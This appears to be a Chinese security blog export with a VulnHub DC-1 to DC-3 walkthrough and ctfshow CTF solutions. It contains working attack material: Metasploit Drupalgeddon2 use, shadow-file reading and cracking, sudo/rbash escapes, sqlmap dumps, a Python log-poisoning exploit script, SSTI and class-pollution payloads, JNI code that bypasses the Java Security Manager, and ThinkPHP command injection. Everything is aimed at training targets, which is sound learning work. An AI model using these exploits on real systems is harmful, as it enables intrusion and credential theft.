[{"content":"「 DC 」是 vulnhub 上的系列靶机，因为参加的某个培训课程用 DC1-3 这三个环境作为练习题目，所以在此记录一下复现的过程\n网络设置 靶机使用的是静态 IP 地址和虚拟机的「桥接网络」模式，这个模式会把宿主机所在网段的 IP 分配给虚拟机，而宿主机所在的网段未必和靶机设置的静态网段相同，这就导致网卡无法正常启动\n那么首先要进入系统修改 /etc/network/interfaces 文件，改成 DHCP 的方式获取 IP。因为靶机没有提供系统用户密码，我们需要修改 GRUB 的启动参数进入系统1\n以靶机的 Debian 系统为例（其他系统会有区别），进入启动菜单后按 e 编辑\n找到 ro（ read-only ），改成「可写」权限并指定启动 shell\nrw signie init=/bin/bash 进入系统后编辑 /etc/network/interfaces，把 eth0 网卡改成 DHCP\nallow-hotplug eth0 iface eth0 inet dhcp 自动获取 IP\ndhclient eth0 然后重启\nDC-1 nmap -sV 收集端口信息\n22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) 80/tcp open http Apache httpd 2.2.22 ((Debian)) 111/tcp open rpcbind 2-4 (RPC #100000) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 80 端口是 Drupal CMS，应该是 CVE-2018-7600 但是我用 nuclei 没扫出来🤔\n用 metasploit 的 drupal_drupalgeddon2 模块直接拿到 shell\nuse unix/webapp/drupal_drupalgeddon2 set RHOSTS 192.168.124.5 run ... meterpreter \u0026gt; shell -it 网站根目录 flag1.txt 中有提示\nEvery good CMS needs a config file - and so do you. 根据提示搜一下配置文件\nfind . -name settings* # ./sites/default/settings.php \u0026lt;?php /** * * flag2 * Brute force and dictionary attacks aren't the * only ways to gain access (and you WILL need access). * What can you do with these credentials? * */ $databases = array ( 'default' =\u0026gt; array ( 'default' =\u0026gt; array ( 'database' =\u0026gt; 'drupaldb', 'username' =\u0026gt; 'dbuser', 'password' =\u0026gt; 'R0ck3t', 'host' =\u0026gt; 'localhost', 'port' =\u0026gt; '', 'driver' =\u0026gt; 'mysql', 'prefix' =\u0026gt; '', ), ), ); ... Code Snippet 1: settings.php 尝试登录 mysql，注意 -p 参数和密码间不要有空格\nmysql -udbuser -pR0ck3t 在 drupaldb.users 表里找到三个用户，密码都是经过加密的\nname pass admin $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR Fred $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg test $S$DTwWb.MjZ8ihU.gMo1vZu32NCKL5p6YJpDVqgorKBibR/bdHK6/k 直接破解密文比较难，而且官方提供了密码的加密脚本，我们可以用脚本加密一个新密码替换 admin 的原密码2\nwww-data@DC-1:/var/www$ php ./scripts/password-hash.sh 1234 password: 1234 hash: $S$DztFxVCdeC3ja0/0GJ.ZkDa01hC/FD5zgb6Ar3/vb1Gzfqu2rhAK mysql\u0026gt; update drupaldb.users set pass='$S$DztFxVCdeC3ja0/0GJ.ZkDa01hC/FD5zgb6Ar3/vb1Gzfqu2rhAK' where name='admin'; 修改密码后登录后台，在 Content 页找到 flag3，又是新的提示\nSpecial PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow. 这里 PERMS 和 FIND 两个大写单词给了提示，应该是用 find 的 SUID 提权读取 shadow 文件内容\nfind . -exec cat /etc/shadow \\; -quit root:$6$91zYUPrB$A/i0KqmGAi.forD5idrSFrDlPGLDoHr33g0gTfW8oJsCBptPsNRNoc0XoqkCwvFU4XMqrocm4KYtPBLqorFpW0:19823:0:99999:7::: daemon:*:17946:0:99999:7::: bin:*:17946:0:99999:7::: sys:*:17946:0:99999:7::: sync:*:17946:0:99999:7::: games:*:17946:0:99999:7::: man:*:17946:0:99999:7::: lp:*:17946:0:99999:7::: mail:*:17946:0:99999:7::: news:*:17946:0:99999:7::: uucp:*:17946:0:99999:7::: proxy:*:17946:0:99999:7::: www-data:*:17946:0:99999:7::: backup:*:17946:0:99999:7::: list:*:17946:0:99999:7::: irc:*:17946:0:99999:7::: gnats:*:17946:0:99999:7::: nobody:*:17946:0:99999:7::: libuuid:!:17946:0:99999:7::: Debian-exim:!:17946:0:99999:7::: statd:*:17946:0:99999:7::: messagebus:*:17946:0:99999:7::: sshd:*:17946:0:99999:7::: mysql:!:17946:0:99999:7::: flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7::: 拿到 shadow 的内容后直接给 john 破解得到弱口令\n❯ john dc1-shadow ... Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist 123456 (root) orange (flag4) 先 ssh 登录 root，然后找到 /root/thefinalflag.txt\nWell done!!!! Hopefully you've enjoyed this and learned some new skills. You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7 啊？通关了？那 flag4 是啥？\n登录 flag4 有个提示 /home/flag4/flag4.txt 🤔\nCan you use this same method to find or access the flag in root? Probably. But perhaps it's not that easy. Or maybe it is? DC-2 nmap 扫一下只扫到 80 端口，直接用 IP 访问会被重定向到 http://dc-2/ ，需要修改 hosts 文件\n进去后知道这是个 WordPress 站点，并且找到第一个提示（flag 1）\n首先 nuclei 扫一下 WordPress，用 wpscan 也行，但是 arch 源仓库的 wpscan 貌似出了个 bug\n还是用 wpscan 扫比较好，nuclei 着重漏洞「检测」而不是「利用」，扫出来的用户名不全\n如何你和我一样用的是 Arch 系统，从源仓库下载的 wpscan 可能会出现错误\ncannot load such file -- ffi_c 直接用 gem（ruby 的包管理器）来下载就没问题了\ngem install wpscan wpscan --url http://dc-2 -e 扫出来一个登录页和用户名枚举漏洞，再联系到 flag1 提示的 cewl 是一个字典生成工具，所以尝试对枚举出来的用户名进行暴力破解\n先构建一个密码字典，然后结合 wpscan 扫出来的用户名暴力破解\ncewl -w pass.txt http://dc-2 wpscan --url http://dc-2 -U admin,jerry,tom -P pass.txt tom 和 jerry 都扫出来了弱口令\n登录进去找到新提示，似乎 WordPress 这条路是走不通的，得另辟蹊径\n发现一开始用 nmap 的默认参数扫端口漏了一个，应该扫全端口的😅\nPORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.10 ((Debian)) 7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) 尝试一下发现 tom 的 wordpress 密码和 ssh 密码相同，直接登录\nssh tom@dc-2 -p 7744 发现 shell 是 rbash，很多命令无法使用，可以用 compgen -c 看看可以执行的命令有哪些\n看到可以运行 vi（其实运行的是 vim）那么参考 GTFOBins 进行提权\nvi --cmd ':set shell=/bin/bash|:shell' 之后再执行命令会显示 command not found 但其实已经拿到功能完整的 bash shell 了，更新一下 PATH 环境变量即可执行常用命令\nexport PATH=/bin:/sbin:/usr/bin:/usr/sbin cat flag3.txt # Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 根据 flag3 的提示使用 su 切换到 jerry 用户，密码是之前扫出来的 wordpress 密码，读到 flag4（tom 也能读到）\ncat /home/jerry/flag4.txt # Good to see that you've made it this far - but you're not home yet. # You still need to get the final flag (the only flag that really counts!!!). # No hints here - you're on your own now. :-) # Go on - git outta here!!!! 还有最后一个 flag，而且提示了 git，自然想到利用 git 提权\n首先检查一下 jerry 的 sudo 列表，可以执行 git（tom 没有 sudo 权限）\nsudo -l # User jerry may run the following commands on DC-2: # (root) NOPASSWD: /usr/bin/git 虽然不允许设置 PAGER 环境变量，但可以先进入默认 pager 再执行命令\nsudo git -p help config !/bin/bash cat /root/final-flag.txt __ __ _ _ _ _ / / /\\ \\ \\___| | | __| | ___ _ __ ___ / \\ \\ \\/ \\/ / _ \\ | | / _` |/ _ \\| '_ \\ / _ \\/ / \\ /\\ / __/ | | | (_| | (_) | | | | __/\\_/ \\/ \\/ \\___|_|_| \\__,_|\\___/|_| |_|\\___\\/ Congratulatons!!! A special thanks to all those who sent me tweets and provided me with feedback - it's all greatly appreciated. If you enjoyed this CTF, send me a tweet via @DCAU7. DC-3 先扫一下全端口，这次确定只有一个 80，是一个 Joomla 站点\nnuclei 直接扫出来后台和 CVE-2017-8917\n用 sqlmap 翻一下数据库，找到 admin 的用户名密码\nsqlmap -u http://192.168.220.165/index.php\\?option\\=com_fields\\\u0026amp;view\\=fields\\\u0026amp;layout\\=modal\\\u0026amp;list\\[fullordering\\]\\=x\\* -D joomladb -T '#__users' -C name,username,password --dump --batch Joomla 的密码用 bcrypt 加密过，一开始我想的是像前面 DC-1 一样修改 admin 的密码，但不知道是不是表名有特殊符号的问题，用 sqlmap 一直没有修改成功。然后改用 john 破解出密码为 snoopy\necho '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' \u0026gt; pass \u0026amp;\u0026amp; john pass 拿到管理员密码后登录 joomla 后台，可以修改模板文件，通过 PHP 反弹 shell3\n访问 /templates/beez3/error.php 页面触发，拿到 www-data 用户权限的 shell\n下一步是提权，把 linux-exploit-suggester 脚本传上去检查一下，发现不少提权风险点，我这边用了 PwnKit\n需要把 poc 源码传到靶机上面编译，不然可能因为 CPU 架构不同执行不了。提权成功后拿到 root 用户目录下的 flag\nhttps://blog.csdn.net/qq_45290991/article/details/114189156\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://drupalchina.cn/node/2128\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://www.leavesongs.com/PHP/backshell-via-php.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2024-12-26","permalink":"https://zrquan.github.io/posts/dc1-3/","tags":["writeup","vulnhub"],"title":"DC 1-3 Writeup"},{"content":"主要是 Web，也会练一下 Misc\n单身杯 easy_mem_1 用 MemProcFS 分析内存并挂载到 dmp 目录\n./memprocfs -device ~/20241029-055419.dmp -mount ~/dmp 计算机名：dmp/sys/computername.txt IP 地址：dmp/sys/net/netstat.txt build 版本号：dmp/sys/version-build.txt 最终得到 ctfshow{ZHUYUN_S_PC_192.168.26.129_22621}\neasy_mem_2 给 MemProcFS 加上 -forensic 1 启用 forensic mode\n可以找到目录 dmp/forensic/files/ROOT/Users/h/Documents/Tencent Files/54297198 以确认 QQ 号\n短剧名和 BV 号都能在浏览器历史 dmp/forensic/web/web.txt 中找到\n最终得到 ctfshow{54297198_穿成魔尊后我一心求死_BV1ZU4y1G7AP}\neasy_mem_3 翻一下 dmp/sys/proc/proc-v.txt 里的进程信息，看到一个可疑进程\n---- Hmohgnsyc.exe 10504 3940 32 U* h \\Device\\HarddiskVolume3\\Users\\h\\AppData\\Roaming\\ToDesk\\dev\\Hmohgnsyc.exe C:\\Users\\h\\AppData\\Roaming\\ToDesk\\dev\\Hmohgnsyc.exe \u0026quot;C:\\Users\\h\\AppData\\Roaming\\ToDesk\\dev\\Hmohgnsyc.exe\u0026quot; 2024-10-29 05:52:14 UTC -\u0026gt; *** Medium 这个叫 Hmohgnsyc.exe 的程序放在 ToDesk 的目录里，查看该程序的信息 dmp/name/Hmohgnsyc.exe-10504/modules/Hmohgnsyc.exe/versioninfo.txt:\nCompany Name: http://www.jieba.net File Description: 超级解霸核心组件(升级界面) File Version: 1, 0, 0, 630 Internal Name: Update Legal Copyright: Copyright 2009 http://www.jieba.net Original Filename: Update.exe Product Name: Update Module Product Version: 1, 0, 0, 630 最后提交：ctfshow{Hmohgnsyc.exe_todesk_jieba.net}\n没耳朵都可以 mp3 文件帧头部结构中，有一个 original 位用来表示文件是否为原版，详情参考：https://www.cnblogs.com/shakin/p/4012780.html\n010Editor 打开文件，根据提示找到以下标志位：\n写个脚本将所有标志位提取出来\noriginal = \u0026quot;\u0026quot; with open(\u0026quot;fox01.mp3\u0026quot;, \u0026quot;rb\u0026quot;) as f: content = f.read() for i, b in enumerate(content): if b == 0xFF and content[i+1] == 0xFB and (content[i+2] in (0xE0, 0xE2)): # 将 bytes 转成二进制表示 binstr = \u0026quot;\u0026quot;.join(map(lambda b: f\u0026quot;{b:08b}\u0026quot;, content[i:i+4])) original += binstr[29] 拿到二进制字符串后，通过调整长宽来形成可读的 flag，可以写个脚本将所有可能的长宽组合都生成图片\nimport os from PIL import Image def create_images_from_binary(binstr: str, output_dir: str, max_width=1000): os.makedirs(output_dir, exist_ok=True) length = len(binstr) for width in range(1, max_width + 1): # 计算高度，向上取整 height = (length + width - 1) // width image = Image.new(\u0026quot;1\u0026quot;, (width, height)) pixels = image.load() # 填充像素 for i in range(length): x = i % width y = i // width pixels[x, y] = int(binstr[i]) # 剩余像素补0 for i in range(length, height * width): x = i % width y = i // width pixels[x, y] = 0 image_path = os.path.join(output_dir, f\u0026quot;img_{width}x{height}.png\u0026quot;) image.save(image_path) print(f\u0026quot;Saved image: {image_path}\u0026quot;) create_images_from_binary(original.strip(), \u0026quot;images\u0026quot;) 可以从图片 img_301x33.png 中抠出 flag\n好玩的 PHP PHP 里一个数字的 md5 值和它的字符串的 md5 值是一样的，即 md5(123) === md5(\u0026quot;123\u0026quot;)\n所以答案是：\n\u0026lt;?php class ctfshow { private $d = '1'; private $s = '2'; private $b = '3'; private $ctf = 123; } $o = new ctfshow(); echo urlencode(serialize($o)); 也可以用 INF：\n\u0026lt;?php class ctfshow { private $d = 'I'; private $s = 'N'; private $b = 'F'; private $ctf = INF; } $o = new ctfshow(); echo urlencode(serialize($o)); 迷雾重重 在 IndexController.php 中有几个 test 开头的路由方法，漏洞其实在 testJson 方法中，该方法会读取 JSON 格式的请求参数 data，然后通过 view('index/view', $data) 将数据传到模板中渲染\nview 方法的实现位于 support/helpers.php\nfunction view(string $template, array $vars = [], string $app = null, string $plugin = null): Response { $request = \\request(); $plugin = $plugin === null ? ($request-\u0026gt;plugin ?? '') : $plugin; $handler = \\config($plugin ? \u0026quot;plugin.$plugin.view.handler\u0026quot; : 'view.handler'); return new Response(200, [], $handler::render($template, $vars, $app, $plugin)); } 从 config/view.php 中可以找到进行模板渲染的 handler 类，继续分析它的 render 方法，发现一处变量覆盖漏洞\n基于这个变量覆盖漏洞，我们可以通过以下步骤来执行命令：\n枚举 /proc/{i}/cmdline 来获取网站根目录的绝对路径 用 PHP 代码覆盖 __template_path__ 变量，通过触发异常将代码写入 webman 的日志文件 由于 webman 的日志文件命名相对固定，可以再次通过变量覆盖来包含刚刚写入代码的日志，以此执行代码 将这些步骤通过脚本实现：\nfrom datetime import datetime import json import httpx BASEURL = \u0026quot;https://55b74c3a-f741-41d3-803e-e327476e7f7b.challenge.ctf.show\u0026quot; URL = f\u0026quot;{BASEURL}/index/testJson\u0026quot; def get_webroot() -\u0026gt; str: with httpx.Client(verify=False) as cli: for i in range(1, 100): data = json.dumps( {\u0026quot;name\u0026quot;: \u0026quot;guest\u0026quot;, \u0026quot;__template_path__\u0026quot;: f\u0026quot;/proc/{i}/cmdline\u0026quot;} ) resp = cli.get(URL, params={\u0026quot;data\u0026quot;: data}) if \u0026quot;start.php\u0026quot; in resp.text: return resp.text.split(\u0026quot;start_file=\u0026quot;)[1][:-11] def write_payload(webroot: str, cmd: str): with httpx.Client(verify=False) as cli: data = json.dumps( { \u0026quot;name\u0026quot;: \u0026quot;guest\u0026quot;, \u0026quot;__template_path__\u0026quot;: f\u0026quot;\u0026lt;?php system('{cmd}');?\u0026gt;\u0026quot;, } ) resp = cli.get(URL, params={\u0026quot;data\u0026quot;: data}) # print(resp.text) def include_payload(webroot: str): with httpx.Client(verify=False) as cli: logfile = datetime.now().strftime(r\u0026quot;webman-%Y-%m-%d.log\u0026quot;) data = json.dumps( {\u0026quot;name\u0026quot;: \u0026quot;guest\u0026quot;, \u0026quot;__template_path__\u0026quot;: f\u0026quot;{webroot}/runtime/logs/{logfile}\u0026quot;} ) resp = cli.get(URL, params={\u0026quot;data\u0026quot;: data}) # print(resp.text) if __name__ == \u0026quot;__main__\u0026quot;: webroot = get_webroot() cmd = \u0026quot;cat /s000ecretF1ag999.txt\u0026quot; write_payload(webroot, f\u0026quot;{cmd} \u0026gt; {webroot}/public/stdout.txt\u0026quot;) include_payload(webroot) with httpx.Client(verify=False) as cli: cmd_stdout = cli.get(f\u0026quot;{BASEURL}/stdout.txt\u0026quot;).text print(cmd_stdout) ez_inject 注册登录后看到提示，并且 Cookie 中会设置一个 JWT\n你觉得你能爆破出来密钥？我觉得吧不如去试着污染，在哪里呢？ 登录还是注册?别忘了注册用户哦 那么考点自然是 Python 原型链污染（）和 Flask\ntip: 实际上 Python 中并没有原型链这个概念，而是通过特殊属性/方法达成类似原型链污染的攻击技巧\n在注册接口可以通过发送以下数据来篡改 Flask 的 SECRET_KEY，注意需要修改成 JSON 格式，因为需要利用对字典的 merge 操作来“污染原型链”\n{\u0026quot;username\u0026quot;: \u0026quot;hacker\u0026quot;, \u0026quot;password\u0026quot;: \u0026quot;qwe123\u0026quot;, \u0026quot;__init__\u0026quot;: {\u0026quot;__globals__\u0026quot;: {\u0026quot;app\u0026quot;: {\u0026quot;config\u0026quot;: {\u0026quot;SECRET_KEY\u0026quot;: \u0026quot;qwe123\u0026quot;}}}}} 官方 wp 是像这样修改 SECRET_KEY 来获取管理员权限，但其实可以直接“污染” is_admin\n{\u0026quot;username\u0026quot;: \u0026quot;hacker\u0026quot;, \u0026quot;password\u0026quot;: \u0026quot;qwe123\u0026quot;, \u0026quot;is_admin\u0026quot;: 1} 然后修改 JWT 的 is_admin 字段获取管理员权限\nflask-unsign --cookie \u0026quot;{'is_admin': 1, 'username': 'hacker'}\u0026quot; --secret qwe123 --sign # eyJpc19hZG1pbiI6MSwidXNlcm5hbWUiOiJoYWNrZXIifQ.Z1LH_w.xUsHvKI86GWV5Yw5uFA7Gec99o4 拿到管理员权限后可以在 /secret 中看到提示\nYou can try to inject on \u0026quot;echo\u0026quot;! 经过尝试确认 echo 接口存在 SSTI，在注入时不需要外面的大括号，而且 waf 拦截了一些关键字。最终通过以下 payload 拿到 flag：\nself['__in''it__']['__glo''bals__']['__buil''tins__']['__imp''ort__']('os').popen('ca''t /flag').read() ezzz_ssti Jinja2 SSTI，但是限制了 payload 的长度\n绕过长度限制可以参考：https://blog.csdn.net/weixin_43995419/article/details/126811287\nFlask 中有一个全局对象 config，是一个继承于字典的数据类，用来保存一些配置信息，可以通过它的 update 方法将任意对象设置到 config 的属性中。那么，我们就可以将过长的 payload 分段保存到 config 中，并设置一个很短的属性名，以此来绕过长度限制\nbypass：\n{{config.update(c=config.update)}} {{config.update(g=\u0026quot;__globals__\u0026quot;)}} {{config.c(f=lipsum[config.g])}} {{config.c(o=config.f.os)}} {{config.c(p=config.o.popen)}} {{config.p(\u0026quot;cat /f*\u0026quot;).read()}} 简单的文件上传 上传一个执行命令的 jar 包并执行，会得到以下异常信息：\nException in thread \u0026quot;main\u0026quot; java.security.AccessControlException: access denied (\u0026quot;java.io.FilePermission\u0026quot; \u0026quot;\u0026lt;\u0026gt;\u0026quot; \u0026quot;execute\u0026quot;) at java.security.AccessControlContext.checkPermission(AccessControlContext.java:472) at java.security.AccessController.checkPermission(AccessController.java:884) at java.lang.SecurityManager.checkPermission(SecurityManager.java:549) at java.lang.SecurityManager.checkExec(SecurityManager.java:799) at java.lang.ProcessBuilder.start(ProcessBuilder.java:1018) at java.lang.Runtime.exec(Runtime.java:620) at java.lang.Runtime.exec(Runtime.java:450) at java.lang.Runtime.exec(Runtime.java:347) at org.example.Main.main(Main.java:5) 那么显然这题的考点是绕过 Security Manager，经过尝试后可以通过 JNI 来绕过，细节参考：https://www.anquanke.com/post/id/151398#h3-8\n题目还有两个需要处理的地方：\n只能上传 jar 文件，所以要将共享链接库的后缀改一下，并不影响使用 得知道上传目录的位置是 /var/www/html/uploads 将以下两个 Java 文件编译成 jar 包\npackage org.example; public class Main { public static void main(String[] args) throws Exception { NativeCall.exec(\u0026quot;cat /secretFlag000.txt\u0026quot;); } } package org.example; public class NativeCall { static { System.load(\u0026quot;/var/www/html/uploads/libNativeCall.jar\u0026quot;); } public native static String exec(String cmd); } 我是直接使用 maven 打包，所以要在 pom.xml 中添加配置\n\u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;!-- Build an executable JAR --\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-jar-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;archive\u0026gt; \u0026lt;manifest\u0026gt; \u0026lt;mainClass\u0026gt;org.example.Main\u0026lt;/mainClass\u0026gt; \u0026lt;/manifest\u0026gt; \u0026lt;/archive\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; 然后是将恶意 C 代码编译成共享链接库\n#include \u0026quot;NativeCall.h\u0026quot; #include\u0026lt;stdlib.h\u0026gt; #ifdef __cplusplus extern \u0026quot;C\u0026quot; { #endif JNIEXPORT jstring JNICALL Java_org_example_NativeCall_exec( JNIEnv *env, jclass cls, jstring j_str) { const char *c_str = NULL; char buff[128] = { 0 }; c_str = (*env)-\u0026gt;GetStringUTFChars(env, j_str, NULL); if (c_str == NULL) { printf(\u0026quot;out of memory.n\u0026quot;); return NULL; } system(c_str); // execute command (*env)-\u0026gt;ReleaseStringUTFChars(env, j_str, c_str); return (*env)-\u0026gt;NewStringUTF(env, buff); } #ifdef __cplusplus } #endif 首先要生成 NativeCall 类的头文件，然后用 gcc 编译共享链接库\n# 1. 编译 NativeCall.class javac src/main/java/org/example/NativeCall.java -d bin # 2. 生成头文件 NativeCall.h javah -jni -classpath ./bin -o NativeCall.h org.example.NativeCall # 3. 编译共享链接库，以 jar 为后缀 gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared NativeCall.c -o libNativeCall.jar 将两个 jar 文件都上传后直接执行就能读到 flag\n西瓜杯 她说她想结婚 附件是周处除三害的截图\n起手 binwalk+foremost 拿到藏在图片里的压缩包，压缩包用了伪加密，用 010Editor 搜 deFlags 将所有 9 改成 0 即可解压得到一堆 txt 文件\n❯ eza -l --time-style full-iso .rwxr-xr-x 0 zrquan 2011-08-28 16:28:27.000000000 +0800 0.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:21.000000000 +0800 1.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:41.000000000 +0800 2.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:27:38.000000000 +0800 3.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:19.000000000 +0800 4.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:36.000000000 +0800 5.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:22.000000000 +0800 6.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:03.000000000 +0800 7.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:24.000000000 +0800 8.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:27:28.000000000 +0800 9.txt .rwxr-xr-x 0 zrquan 2011-08-28 16:28:39.000000000 +0800 10.txt .rwxr-xr-x 22k zrquan 2024-06-22 00:52:12.752078000 +0800 flag.txt .rwxr-xr-x 0 zrquan 2012-05-20 13:14:52.000000000 +0800 tips.txt 除了 flag.txt 有一堆意义不明的中文文本，其他文件都是空的，但是明显时间被动过手脚，特别是 tips.txt 的修改时间看到 5201314\n首先看 flag.txt，用 bat 看一下内容\n从末尾的一堆空白字符可以想到 SNOW 隐写，而且题目提示了图片中陈桂林的台词是某个 key，那么把台词作为 password 用 SNOW 解密 flag.txt 就可以拿到前半个 flag\n再回到剩下的 txt 文件，之前发现它们的时间有蹊跷，那么检查一下它们的时间戳\n❯ eza -l --time-style '+%s' .rwxr-xr-x 0 zrquan 1314520107 0.txt .rwxr-xr-x 0 zrquan 1314520101 1.txt .rwxr-xr-x 0 zrquan 1314520121 2.txt .rwxr-xr-x 0 zrquan 1314520058 3.txt .rwxr-xr-x 0 zrquan 1314520099 4.txt .rwxr-xr-x 0 zrquan 1314520116 5.txt .rwxr-xr-x 0 zrquan 1314520102 6.txt .rwxr-xr-x 0 zrquan 1314520083 7.txt .rwxr-xr-x 0 zrquan 1314520104 8.txt .rwxr-xr-x 0 zrquan 1314520048 9.txt .rwxr-xr-x 0 zrquan 1314520119 10.txt .rwxr-xr-x 22k zrquan 1718988732 flag.txt .rwxr-xr-x 0 zrquan 1337490892 tips.txt 发现时间戳都是以 1314520 开头，而且剩下的数字都 ascii 码表内，我们尝试将其提取出来解码\nresult = \u0026quot;\u0026quot; for i in [107,101,121,58,99,116,102,83,104,48,119]: result += chr(i) print(result) # key:ctfSh0w 又拿到一个 key，用在哪里呢？原来最初的 flag.png 中还藏了东西，下图中 9E97BA2A 是 OurSecret 加密的特征。OurSecret 是一个文档加密工具，可以将一些私密文件隐藏在其他文件里，需要通过密码来提取，也就是这个 key\n直接用 OurSecret 打开 flag.png 会识别不到里面的加密数据，需要将后面 zip 文件的数据(504B0304 开头)先删除，然后拿到以下文本：\nJRDEWV2JKIZUKR2KJBCVGWKTJBGEUVSWIVGVIWKHIJGFOWKXJJLE2UK2IVKVES2WJZFEYR2RKZKDES22GJLFKM2DIZEEMSKGINIEUNI= 用 CyberChef 的 Magic 模块直接解出 flag\nBase32 -\u0026gt; Base32 -\u0026gt; Base64 -\u0026gt; Base64 最后得到：ctfshow{W1sh1ng_every0ne_4_happy_time_pl4ying}\n你是我的眼 反编译 jar 然后审计 Main.java\npublic class Main { private static final String PART1 = \u0026quot;U2NF9CSUFOTUF9\u0026quot;; private static final String PART2 = \u0026quot;Xw-\u0026quot;; private static final String PART3 = \u0026quot;Q1RGU2hvd3tURVNUX0\u0026quot;; private static final String PART4 = \u0026quot;JBU0\u0026quot;; public static String customDecode(String input) { String standardInput = input.replace('-', '+').replace('_', '/'); return new String(Base64.getDecoder().decode(standardInput)); } public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.println(\u0026quot;请输入FLAG:\u0026quot;); String userInput = scanner.nextLine(); String flag = \u0026quot;Q1RGU2hvd3tURVNUX0JBU0U2NF9CSUFOTUF9Xw-\u0026quot;; String decodedFlag = customDecode(flag); String cleanInput = userInput.replace(\u0026quot;_\u0026quot;, \u0026quot;\u0026quot;).replace(\u0026quot;\\u000f\u0026quot;, \u0026quot;\u0026quot;); if (checkflag(cleanInput, decodedFlag)) { System.out.println(\u0026quot;flag正确\u0026quot;); } else { System.out.println(\u0026quot;输入错误\u0026quot;); } scanner.close(); } private static boolean checkflag(String input, String CTFflag) { return CTFflag.replace(\u0026quot;_\u0026quot;, \u0026quot;\u0026quot;).replace(\u0026quot;\\u000f\u0026quot;, \u0026quot;\u0026quot;).equals(input); } } 官方 wp 中出题的思路应该是比较复杂的，但其实直接 base64 解码 flag 变量就完事了\u0026hellip;\n❯ echo 'Q1RGU2hvd3tURVNUX0JBU0U2NF9CSUFOTUF9Xw-' | base64 -d CTFShow{TEST_BASE64_BIANMA}_base64: invalid input 提交 CTFShow{TEST_BASE64_BIANMA}\nCodeInject 签到题，直接执行代码\nhttp --verify no -f https://2db56ea5-d48e-469f-ae42-194cc9bd7a06.challenge.ctf.show/ 1=\u0026quot;system('cat /000f1ag.txt')\u0026quot; tpdoor 题目提供的代码很有限，只知道可以通过 isCache 参数控制 request_cache_key 配置项\n先通过路由错误确认 ThinkPHP 的版本为 V8.0.3\nhttps://acf3a4dd-e196-4d00-ba5a-4443ee775efb.challenge.ctf.show/?s=foo 然后需要审计一下 ThinkPHP 源码，既然可以控制缓存机制的 key，题目代码中也启用了检查缓存的中间件 CheckRequestCache，就从它入手\n审计代码可以发现漏洞存在于 parseCacheKey 方法，L152 以 | 分割 key，然后将后面部分赋值给 $fun 。之后没有经过任何安全过滤，在 L178 把 $fun 作为函数执行，而参数就是分割后的前面部分\nso\nhttp -b bd7550d8-af8b-4361-9bad-e169fd8ec931.challenge.ctf.show isCache=='ls /|system' cacheTime==5 http -b bd7550d8-af8b-4361-9bad-e169fd8ec931.challenge.ctf.show isCache=='cat /000f1ag.txt|system' cacheTime==5 tips 如果你已经触发了缓存而且没设置 cacheTime，重启容器吧，不然一个小时后才会刷新缓存 拿不到结果可以多刷新几次页面 easy_polluted Python 的原型污染，需要绕过黑名单，而且黑名单中有下划线，估计就是编码绕过了\ndef filter(user_input): blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string'] for pattern in blacklisted_patterns: if re.search(pattern, user_input, re.IGNORECASE): return True return False 审计代码可以看到会先用 filter 函数检查黑名单，然后用 json.loads 解析 JSON 数据，而按照 JSON 的规范，遇到 \\u 开头的 unicode 转义序列是会自动解析成 unicode 字符的\n@app.route('/',methods=['POST']) def index(): username = request.form.get('username') password = request.form.get('password') session[\u0026quot;username\u0026quot;] = username session[\u0026quot;password\u0026quot;] = password Evil = evil() if request.data: if filter(str(request.data)): return \u0026quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~\u0026quot; else: merge(json.loads(request.data), Evil) return \u0026quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED\u0026quot; return render_template(\u0026quot;index.html\u0026quot;) @app.route('/admin',methods=['POST', 'GET']) def templates(): username = session.get(\u0026quot;username\u0026quot;, None) password = session.get(\u0026quot;password\u0026quot;, None) if username and password: if username == \u0026quot;adminer\u0026quot; and password == app.secret_key: return render_template(\u0026quot;flag.html\u0026quot;, flag=open(\u0026quot;/flag\u0026quot;, \u0026quot;rt\u0026quot;).read()) else: return \u0026quot;Unauthorized\u0026quot; else: return f'Hello, This is the POLLUTED page.' 另外，flag.html 中用的并不是 jinja 的默认语法\n\u0026lt;body\u0026gt; 这又是什么jinja语法啊！ [#flag#] \u0026lt;/body\u0026gt; 